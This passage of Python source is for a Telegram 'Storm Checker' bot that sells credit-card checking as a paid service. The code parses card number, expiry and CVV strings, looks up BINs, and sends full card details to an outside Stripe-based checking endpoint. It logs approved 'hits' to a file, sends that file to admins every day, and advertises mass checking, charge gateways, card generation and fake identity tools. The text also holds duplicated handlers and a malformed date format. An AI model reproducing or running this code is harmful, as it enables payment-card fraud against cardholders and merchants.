            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Site Based [1$]'
        }
    

def check_au_cc(cc):
    try:
        # Normalize card input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]

        # Validate format
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format: Use CC|MM|YY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe Auth 2'
            }

        cc_num = lista[0]
        mm = lista[1].zfill(2)
        yy_raw = lista[2]
        cvv = lista[3]

        # Normalize year
        if yy_raw.startswith("20") and len(yy_raw) == 4:
            yy = yy_raw[2:]
        elif len(yy_raw) == 2:
            yy = yy_raw
        else:
            yy = '00'

        # BIN defaults
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'

        # BIN Lookup
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception:
            pass

        # Final formatted CC
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        try:
            # API request to AU endpoint
            response = requests.get(f"https://darkboy-auto-stripe.onrender.com/gateway=autostripe/key=darkboy/site=abandonharris.com/cc={formatted_cc}", timeout=300)
            if response.status_code == 200:
                try:
                    data = response.json()
                    status = str(data.get('status', 'DECLINED')).upper()
                    message = str(data.get('response') or data.get('message') or 'Your card was declined.')
                except:
                    status = 'ERROR'
                    message = 'Invalid response from API'
            else:
                status = 'ERROR'
                message = f"API error: {response.status_code}"

            # Final status fix
            if 'APPROVED' in status:
                status = 'APPROVED'
                with open('HITS.txt', 'a') as hits:
                    hits.write(formatted_cc + '\n')
            elif 'DECLINED' in status:
                status = 'DECLINED'
            elif 'ccn' in message.lower():
                status = 'CCN'
            elif status not in ['APPROVED', 'DECLINED', 'CCN']:
                status = 'ERROR'

            return {
                'status': status,
                'card': formatted_cc,
                'message': message,
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 2'
            }

        except Exception as e:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f"Request error: {str(e)}",
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': 'Stripe Auth 2'
            }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"Input error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Stripe Auth 2'
        }


def confirm_time():
    utc_now = datetime.now(timezone.utc)
    ksa_now = utc_now + timedelta(hours=3)
    ksa_date = ksa_now.date()
    if ksa_date > datetime(2025, 12, 25).date():
        return False
    return True

def format_single_response(result, user_full_name, processing_time):
    status_emoji = {
        'APPROVED': '✅',
        'DECLINED': '❌',
        'CCN': '🟡',
        'ERROR': '⚠️'
    }
    
    status_text = {
        'APPROVED': '𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝',
        'DECLINED': '𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝',
        'CCN': '𝐂𝐂𝐍',
        'ERROR': '𝐄𝐫𝐫𝐨𝐫'
    }

    # Get user ID from card result
    user_id_str = str(result.get('user_id', ''))
    
    # Determine user status
    if user_id_str == "7820713047":
        user_status = "Owner"
    elif user_id_str in ADMIN_IDS:
        user_status = "Admin"
    elif is_user_subscribed(int(user_id_str)):
        user_status = "Premium"
    else:
        user_status = "Free"

    response = f"""
┏━━━━━━━⍟
┃ {status_text[result['status']]} {status_emoji[result['status']]}
┗━━━━━━━━━━━⊛

⌯ 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ <i>{result['gateway']}</i> 
⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>{result['message']}</i>

⌯ 𝗜𝗻𝗳𝗼 ➳ {result['brand']}
⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {result['type']}
⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {result['country']}

⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ {user_full_name}[{user_status}]
⌯ 𝐃𝐞𝐯 ⌁ <a href='tg://user?id=6521162324'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>
⌯ 𝗧𝗶𝗺𝗲 ➳ {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
"""
    return response

def format_mchk_response(results, total_cards, processing_time, checked=0):
    approved = sum(1 for r in results if r['status'] == 'APPROVED')
    ccn = sum(1 for r in results if r['status'] == 'CCN')
    declined = sum(1 for r in results if r['status'] == 'DECLINED')
    errors = sum(1 for r in results if r['status'] == 'ERROR')
    
    status_emojis = {
        'APPROVED': '✅',
        'DECLINED': '❌',
        'CCN': '🟡',
        'ERROR': '⚠️'
    }
    
    response = f"""

✧ 𝐓𝐨𝐭𝐚𝐥↣{checked}/{total_cards}
✧ 𝐂𝐡𝐞𝐜𝐤𝐞𝐝↣{checked}/{total_cards}
✧ 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝↣{approved}  
✧ 𝐂𝐂𝐍↣{ccn}
✧ 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝↣{declined}
✧ 𝐄𝐫𝐫𝐨𝐫𝐬↣{errors}
✧ 𝐓𝐢𝐦𝐞↣{processing_time:.2f} 𝐒  

<b>𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸</b>
──────── ⸙ ─────────
"""
    
    for result in results:
        emoji = status_emojis.get(result['status'], '❓')
        response += f"<code>{result['card']}</code>\n𝐒𝐭𝐚𝐭𝐮𝐬➳{emoji} {result['message']}\n──────── ⸙ ─────────\n"
    
    return response

def format_broadcast_response(total, success, failed, errors, processing_time):
    return f"""
┌───────────────
│ 🔎 Total: {total}
│ ✅ Successful: {success}
│ ❌ Failed: {failed}
│ ⚠️ Errors: {errors}
│ ⏱️ Time: {processing_time:.2f} S
└───────────────
"""

def send_hits_to_admins():
    try:
        if os.path.exists('HITS.txt') and os.path.getsize('HITS.txt') > 0:
            for admin_id in ADMIN_IDS:
                with open('HITS.txt', 'rb') as f:
                    bot.send_document(admin_id, f, caption="✅ Daily Approved Cards (HITS) 📂")
    except Exception as e:
        print(f"Error sending HITS.txt: {str(e)}")

def schedule_daily_hits():
    schedule.every().day.at("05:00").do(send_hits_to_admins)  # 5:00 UTC = 8:00 KSA
    while True:
        schedule.run_pending()
        time.sleep(60)


# Handle both /start and .start
@bot.message_handler(commands=['start', 'cmds'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.start') or m.text.startswith('.cmds')))
def send_welcome(message):
    # Add ban check here (NEW CODE)
    user_id = str(message.from_user.id)
    if user_id in BANNED_USERS:
        if BANNED_USERS[user_id] > time.time():
            remaining = BANNED_USERS[user_id] - time.time()
            hours = int(remaining // 3600)
            minutes = int((remaining % 3600) // 60)
            bot.reply_to(message, f"❌ You are restricted from using this bot!\nTime remaining: {hours}h {minutes}m")
            return
        else:
            del BANNED_USERS[user_id]  # Remove if ban expired
            with open('banned_users.json', 'w') as f:
                json.dump(BANNED_USERS, f)
    
    # Existing checks below (ORIGINAL CODE)
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    
    show_main_menu(message.chat.id)
@bot.message_handler(commands=['start', 'cmds'])
@bot.message_handler(func=lambda m: m.text and (m.text.startswith('.start') or m.text.startswith('.cmds')))
def send_welcome(message):
    ban_msg = check_if_banned(message.from_user.id)
    if ban_msg:
        bot.reply_to(message, ban_msg)
        return
    
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted...")
        return
    
    show_main_menu(message.chat.id)

def send_welcome(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @stormxvup or subscribe to use in DMs.")
        return
    
    show_main_menu(message.chat.id)

def create_main_menu_buttons():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Gateway", callback_data="main_gateway"),
        types.InlineKeyboardButton("Tools", callback_data="main_tools"),
        types.InlineKeyboardButton("Buy", callback_data="buy_plans")
    )
    return markup

def create_gateway_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Auth", callback_data="gateway_auth"),
        types.InlineKeyboardButton("Charged", callback_data="gateway_charged"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
    )
    return markup

def create_tools_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Basic", callback_data="tools_basic"),
        types.InlineKeyboardButton("Standard", callback_data="tools_standard"),
        types.InlineKeyboardButton("Powerful", callback_data="tools_powerful"),
        types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
    )
    return markup

def create_auth_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Braintree", callback_data="auth_braintree"),
        types.InlineKeyboardButton("Stripe", callback_data="auth_stripe"),
        types.InlineKeyboardButton("Paypal", callback_data="auth_paypal"),
        types.InlineKeyboardButton("3DS Lookup", callback_data="auth_3ds"),
        types.InlineKeyboardButton("🔙 Back", callback_data="gateway_commands")
    )
    return markup

def create_charged_submenu():
    markup = types.InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        types.InlineKeyboardButton("Stripe", callback_data="charged_stripe"),
        types.InlineKeyboardButton("Site Based", callback_data="charged_site"),
        types.InlineKeyboardButton("Paypal", callback_data="charged_paypal"),
        types.InlineKeyboardButton("Shopify", callback_data="charged_shopify"),
        types.InlineKeyboardButton("Braintree", callback_data="charged_braintree"),
        types.InlineKeyboardButton("Auth Net", callback_data="charged_authnet"),
        types.InlineKeyboardButton("🔙 Back", callback_data="gateway_commands")
    )
    return markup

def show_main_menu(chat_id, message_id=None):
    welcome_text = """
✦ 𝑺𝒕𝒐𝒓𝒎 ✗ 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 𖤐

This bot checks credit cards using Auth.
"""
    image_url = "https://i.ibb.co/DHtLXvgV/photo-5843525765143054522-c.jpg"

    try:
        if message_id:
            bot.edit_message_media(
                chat_id=chat_id,
                message_id=message_id,
                media=types.InputMediaPhoto(image_url, caption=welcome_text),
                reply_markup=create_main_menu_buttons()
            )
        else:
            bot.send_photo(chat_id, photo=image_url, caption=welcome_text, 
                         reply_markup=create_main_menu_buttons(), parse_mode='HTML')
    except Exception as e:
        if message_id:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=welcome_text,
                reply_markup=create_main_menu_buttons(),
                parse_mode='HTML'
            )
        else:
            bot.send_message(chat_id, welcome_text, 
                           reply_markup=create_main_menu_buttons(), 
                           parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        if call.data == "back_to_main":
            show_main_menu(call.message.chat.id, call.message.message_id)
            
        elif call.data == "main_gateway":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="🔹 Select Gateway Type:",
                reply_markup=create_gateway_submenu()
            )
            
        elif call.data == "main_tools":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="🔹 Select Tools Category:",
                reply_markup=create_tools_submenu()
            )
            
        elif call.data == "gateway_auth":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="🔹 Select Auth Type:",
                reply_markup=create_auth_submenu()
            )
            
        elif call.data == "gateway_charged":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="🔹 Select Charged Gateway:",
                reply_markup=create_charged_submenu()
            )
            
        # Auth submenu handlers
        elif call.data == "auth_braintree":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Braintree Auth
✧ CMD: /b3 [Single]
✧ CMD: /mb3 [Mass]
✧ Status: Active ✅

✧ NAME: Braintree Auth 2
✧ CMD: /b4 [Single]
✧ CMD: /mb4 [Mass]
✧ Status: Active ✅

""",
                reply_markup=create_auth_submenu()
            )
            
        elif call.data == "auth_stripe":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Stripe Auth
✧ CMD: /chk [Single]
✧ CMD: /mchk [Mass]
✧ Status: Active ✅

✧ NAME: Stripe Auth 2
✧ CMD: /au [Single]
✧ CMD: /mass [Mass]
✧ Status: Active ✅

✧ NAME: Stripe Auth 3
✧ CMD: /sr [Single]
✧ CMD: /msr [Mass]
✧ Status: Active ✅

✧ NAME: Stripe Premium Auth 
✧ CMD: /sp [Single]
✧ CMD: /msp [Mass]
✧ Status: Active ✅
""",
                reply_markup=create_auth_submenu()
            )
            
        elif call.data == "auth_paypal":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""

✧ NAME: Paypal 
✧ CMD: /pp [Single]
✧ Status: Active ✅

""",
                reply_markup=create_auth_submenu()
            )
            
        elif call.data == "auth_3ds":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: 3DS Lookup
✧ CMD: /vbv [Single]
✧ CMD: /mvbv [Mass]
✧ Status: Active ✅

✧ NAME: 3DS Site Based
✧ CMD: /svb [Single]
✧ CMD: /msvb [Mass]
✧ Status: Active ✅
""",
                reply_markup=create_auth_submenu()
            )
            
        # Charged submenu handlers
        elif call.data == "charged_stripe":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Stripe Charged 1
✧ CMD: /sx [Single]
✧ CMD: /msx [Mass]
✧ Charge: $1.00
✧ Status: Active ✅

✧ NAME: Stripe Charged 2
✧ CMD: /st [Single]
✧ CMD: /mst [Mass]
✧ Charge: $5.00
✧ Status: Active ✅

✧ NAME: Stripe Charged 3
✧ CMD: /sf [Single]
✧ CMD: /msf [Mass]
✧ Charge: $10.00
✧ Status: Active ✅
""",
                reply_markup=create_charged_submenu()
            )
            
        elif call.data == "charged_site":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Site Based 
✧ CMD: /cc [Single]
✧ CMD: /mcc [Mass]
✧ Status: Active ✅
✧ Charge: $1.00

✧ NAME: Site Based 
✧ CMD: /mx [Single]
✧ CMD: /max [Mass]
✧ Status: Active ✅
✧ Charge: $5.00

✧ NAME: Site Based 
✧ CMD: /mo [Single]
✧ CMD: /mmo [Mass]
✧ Status: Active ✅
✧ Charge: $10.00

""",
                reply_markup=create_charged_submenu()
            )
            
        elif call.data == "charged_paypal":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""

✧ NAME: Paypal Charged  
✧ CMD: /pp [Single]
✧ Status: Active ✅
✧ Charge: $2.00 

✧ NAME: Paypal+Stripe 
✧ CMD: /ax [Single]
✧ CMD: /max [Mass]
✧ Status: Active ✅
✧ Charge: $0.5

✧ NAME: Paypal Charged  
✧ CMD: /py [Single]
✧ CMD: /mpy [Mass]
✧ Status: Active ✅
✧ Charge: $0.1
""",
                reply_markup=create_charged_submenu()
            )
            
        elif call.data == "charged_shopify":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""

✧ NAME: Self Shopify 
✧ CMD: /sh [Single]
✧ Status: Active ✅
✧ Charge: Self

""",
                reply_markup=create_charged_submenu()
            )
            
        elif call.data == "charged_braintree":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Braintree
✧ CMD: /br [Single]
✧ CMD: /mbr [Mass]
✧ CHARGE : [1$]
✧ Status: Active ✅
""",
                reply_markup=create_charged_submenu()
            )
            
        elif call.data == "charged_authnet":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Auth Net
✧ CMD: /ah [Single]
✧ CMD: /mah [Mass]
✧ Status: Active ✅
✧ Charge: $1.00

✧ NAME: Auth Net
✧ CMD: /at [Single]
✧ CMD: /mat [Mass]
✧ Status: Active ✅
✧ Charge: $49.00
""",
                reply_markup=create_charged_submenu()
            )
            
        # Tools submenu handlers
        elif call.data == "tools_basic":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""

✧ NAME: Basic Tools
✧ /bin - BIN Lookup
✧ /gen - Generate CCs
✧ /info - User Info
✧ /credits - Check Credits

""",
                reply_markup=create_tools_submenu()
            )
            
        elif call.data == "tools_standard":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Standard Tools
✧ /gate - Find Payment Gateways
✧ /fake - Generate Fake Info
✧ /open - Open Text File
✧ /split - Split File

""",
                reply_markup=create_tools_submenu()
            )
            
        elif call.data == "tools_powerful":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="""
✧ NAME: Powerful Tools
✧ /sk - Check Stripe Key
✧ /true - Phone Number Info
✧ /ai - AI Chat
✧ /wh - Weather Info

""",
                reply_markup=create_tools_submenu()
            )
            
        # Buy plans
        elif call.data == "buy_plans":
            plans_text = """
┏━━━━━━━⍟
┃ 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐏𝐥𝐚𝐧𝐬
┗━━━━━━━━━━━⊛
━━━━━━━━━━━━━━━━━━
➤ 7 Days Plan - $3 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ Standard Support
✧ Rank : Basic Plan
✧ Use in DMs
✧ Increased mass check limit (30)
─━─━─━─━─━─
➤ 15 Days Plan - $6 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ Priority Support
✧ Access to Private BINs
✧ Rank : Standard Plan
✧ Use in DMs
✧ Increased mass check limit (30)
─━─━─━─━─━─
➤ 30 Days Plan - $10 💰
✧ Unlimited CC Checks
✧ No Flood Control
✧ VIP Support (Faster Response)
✧ Access to Private BINs
✧ Early Access to New Features
✧ Rank : Primium Plan
✧ Use in DMs
✧ Increased mass check limit (30)
─━─━─━─━─━─
✧ Payment Method:
💳 UPI ID: `DM`
📩 Contact: @darkboy336 to purchase
━━━━━━━━━━━━━━━━━━
"""
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=plans_text,
                reply_markup=create_main_menu_buttons()
            )
            
        # Handle back button from auth/charged submenus
        elif call.data == "gateway_commands":
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption="🔹 Select Gateway Type:",
                reply_markup=create_gateway_submenu()
            )
            
    except Exception as e:
        print(f"Error handling callback: {e}")
        
# Handle both /grant and .grant
@bot.message_handler(commands=['grant'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.grant'))
def grant_access(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        chat_id = message.text.split()[1]

        # Add to local set
        APPROVED_GROUPS.add(chat_id)

        # Save to Firebase
        write_firebase("approved_groups", list(APPROVED_GROUPS))

        # Optionally still save to local file (for backup or offline use)
        with open('approved_groups.txt', 'a') as f:
            f.write(f"{chat_id}\n")

        bot.reply_to(message, f"✅ Group {chat_id} has been added to the approved list.")

    except Exception as e:
        bot.reply_to(message, "❌ Invalid format. Use /grant chat_id or .grant chat_id")


# Handle both /addcr and .addcr
@bot.message_handler(commands=['addcr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.addcr'))
def handle_add_credits(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return

    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Invalid format. Use /addcr user_id credits or .addcr user_id credits")
            return

        user_id = parts[1]
        try:
            credits = int(parts[2])
            if credits <= 0:
                bot.reply_to(message, "❌ Credits must be a positive number")
                return
        except ValueError:
            bot.reply_to(message, "❌ Credits must be a number")
            return

        # Load existing user credits from Firebase
        USER_CREDITS = read_firebase("user_credits")

        # Initialize user if not exists
        if user_id not in USER_CREDITS:
            USER_CREDITS[user_id] = {
                'date': str(datetime.now().date()),
                'credits': 0
            }

        # Add credits
        USER_CREDITS[user_id]['credits'] += credits

        # Save back to Firebase
        write_firebase("user_credits", USER_CREDITS)

        bot.reply_to(message, f"✅ Added {credits} credits to user {user_id}. Total credits now: {USER_CREDITS[user_id]['credits']}")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /subs and .subs
@bot.message_handler(commands=['subs'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.subs'))
def handle_subscription(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Invalid format. Use /subs user_id plan (1=7d, 2=15d, 3=30d)")
            return
            
        user_id = parts[1]
        plan = int(parts[2])
        
        if plan not in [1, 2, 3]:
            bot.reply_to(message, "❌ Invalid plan. Use 1=7d, 2=15d, 3=30d")
            return
            
        # Calculate expiry date
        if plan == 1:
            days = 7
        elif plan == 2:
            days = 15
        else:
            days = 30
            
        expiry_date = datetime.now() + timedelta(days=days)
        expiry_str = expiry_date.strftime("%Y-%m-%d")
        
        # Add to subscribed users in Firebase
        SUBSCRIBED_USERS[user_id] = {
            'plan': plan,
            'expiry': expiry_str
        }
        
        # Save to Firebase
        write_firebase("subscribed_users", SUBSCRIBED_USERS)
            
        bot.reply_to(message, f"✅ User {user_id} subscribed to plan {plan} (expires {expiry_str})")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['generate'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.generate'))
def handle_generate(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /generate number or .generate number")
            return
            
        try:
            num_keys = int(parts[1])
            if num_keys <= 0:
                bot.reply_to(message, "❌ Number of keys must be at least 1")
                return
            elif num_keys > 100:
                bot.reply_to(message, "⚠️ Maximum 100 keys at a time. Generating 100 keys.")
                num_keys = 100
        except ValueError:
            bot.reply_to(message, "❌ Please provide a valid number")
            return
            
        # Load existing codes from Firebase
        REDEEM_CODES = read_firebase("redeem_codes") or {}
        
        # Generate keys
        keys = []
        for _ in range(num_keys):
            # Generate a new code with the required format and length
            key = f"DARK-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))}-STORM"
            keys.append(key)
            
            # Store key with expiry (5 days from now)
            expiry_date = datetime.now() + timedelta(days=5)
            REDEEM_CODES[key] = {
                'value': 10,  # Each key gives 10 credits
                'expiry': expiry_date.strftime("%Y-%m-%d"),
                'used': False,
                'used_by': None,
                'used_date': None
            }
        
        # Save to Firebase
        if not write_firebase("redeem_codes", REDEEM_CODES):
            raise Exception("Failed to save redeem codes to Firebase")
            
        # Format the keys for display
        keys_list = "\n".join([f"➔ {key}" for key in keys])
        response = f"""
𝗥𝗲𝗱𝗲𝗲𝗺 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 ✅

✧ 𝘈𝘮𝘰𝘶𝘯𝘵 : {num_keys} 
✧ 𝘷𝘢𝘭𝘶𝘦: 10 credits each
✧ 𝘷𝘢𝘭𝘪𝘥𝘪𝘵𝘺: 5 days

{keys_list}

How to redeem:
Use /redeem CODE in this chat
Example: /redeem DARK-HUSSLLZ7Z5Y-STORM
"""
        bot.reply_to(message, response, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['redeem'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.redeem'))
def handle_redeem(message):
    try:
        # Check if user is banned
        BANNED_USERS = read_firebase("banned_users") or {}
        if str(message.from_user.id) in BANNED_USERS:
            bot.reply_to(message, "❌ You are banned from using this bot")
            return

        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Invalid format. Use /redeem KEY or .redeem KEY")
            return

        key = parts[1].strip().upper()  # Normalize key to uppercase

        # Load all data from Firebase
        REDEEM_CODES = read_firebase("redeem_codes") or {}
        USER_CREDITS = read_firebase("user_credits") or {}
        SUBSCRIBED_USERS = read_firebase("subscribed_users") or {}

        # Debug: Print current redeem codes to check if loading properly
        print(f"Current redeem codes in Firebase: {REDEEM_CODES}")

        # Check if key exists and is valid
        if key not in REDEEM_CODES:
            bot.reply_to(message, f"❌ Invalid redeem code. No such code found in database.")
            return

        key_data = REDEEM_CODES[key]

        # Check if key is already used
        if key_data.get('used', False):
            used_by = key_data.get('used_by', 'unknown user')
            used_date = key_data.get('used_date', 'unknown date')
            bot.reply_to(message, f"❌ This code was already redeemed by {used_by} on {used_date}")
            return

        # Check if key is expired
        try:
            expiry_date = datetime.strptime(key_data['expiry'], "%Y-%m-%d")
            if datetime.now() > expiry_date:
                bot.reply_to(message, f"❌ This code expired on {key_data['expiry']}")
                return
        except KeyError:
            bot.reply_to(message, "❌ This code has no expiry date and is invalid")
            return

        # Prepare updated data
        user_id = str(message.from_user.id)
        now = datetime.now().strftime("%Y-%m-%d")
        credit_value = key_data.get('value', 10)  # Default to 10 if not specified
        
        # Initialize user credits if not exists
        if user_id not in USER_CREDITS:
            USER_CREDITS[user_id] = {
                'date': now,
                'credits': 0,
                'redeemed_credits': 0,  # Initialize this field
                'last_redeem': None
            }

        # Update user credits
        USER_CREDITS[user_id]['credits'] = USER_CREDITS[user_id].get('credits', 0) + credit_value
        USER_CREDITS[user_id]['redeemed_credits'] = USER_CREDITS[user_id].get('redeemed_credits', 0) + credit_value
        USER_CREDITS[user_id]['last_redeem'] = now

        # Update redeem code status
        REDEEM_CODES[key].update({
            'used': True,
            'used_by': user_id,
            'used_date': now
        })

        response_msg = [
            f"✅ Successfully redeemed {credit_value} credits!",
            f"💰 Your new balance: {USER_CREDITS[user_id]['credits']} credits"
        ]
        
        # Check for premium upgrade (600 credits = Basic Plan)
        if USER_CREDITS[user_id].get('redeemed_credits', 0) >= 600 and not is_user_subscribed(message.from_user.id):
            expiry_date = datetime.now() + timedelta(days=7)  # 7 days for Basic Plan
            expiry_str = expiry_date.strftime("%Y-%-%d")
            SUBSCRIBED_USERS[user_id] = {
                'plan': 1,  # Basic Plan
                'expiry': expiry_str,
                'upgraded_via': 'redeem'
            }
            response_msg.append("\n🎉 Congratulations! You've been upgraded to Basic Plan for 7 days!")
            response_msg.append(f"⏳ Plan expires on: {expiry_str}")

        # Save updates to Firebase
        update_success = True
        if not write_firebase("redeem_codes", REDEEM_CODES):
            update_success = False
        if not write_firebase("user_credits", USER_CREDITS):
            update_success = False
        if not write_firebase("subscribed_users", SUBSCRIBED_USERS):
            update_success = False

        if not update_success:
            raise Exception("Failed to update database. Please try again later.")

        # Send success message
        bot.reply_to(message, "\n".join(response_msg))

    except Exception as e:
        error_msg = [
            "❌ Failed to process redemption:",
            str(e),
            "Please contact support if this persists."
        ]
        bot.reply_to(message, "\n".join(error_msg))
        print(f"Redeem error for user {message.from_user.id}: {str(e)}")
        print(f"Traceback: {traceback.format_exc()}")  # Add this at top of file: import traceback

@bot.message_handler(commands=['broadcast'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.broadcast'))
def handle_broadcast(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ You are not authorized to use this command.")
        return
        
    try:
        # Extract message
        broadcast_msg = message.text.split(maxsplit=1)[1].strip() if len(message.text.split()) > 1 else ""
            
        if not broadcast_msg:
            bot.reply_to(message, "❌ Please provide a message to broadcast.")
            return
            
        start_time = time.time()
        status_msg = bot.reply_to(message, "Starting broadcast...")
        
        def do_broadcast():
            try:
                # Get all data from Firebase
                user_credits = read_firebase("user_credits") or {}
                subscribed_users = read_firebase("subscribed_users") or {}
                approved_groups = read_firebase("approved_groups") or []
                
                # Prepare recipient lists
                all_users = set(user_credits.keys()).union(set(subscribed_users.keys()))
                all_groups = set(approved_groups)
                
                total = len(all_users) + len(all_groups)
                success = 0
                failed = 0
                errors = 0
                
                def update_status():
                    processing_time = time.time() - start_time
                    status_text = f"""
┌───────────────
│ 🔎 Total: {total}
│ ✅ Successful: {success}
│ ❌ Failed: {failed}
│ ⚠️ Errors: {errors}
│ ⚡ Progress: {success + failed + errors}/{total}
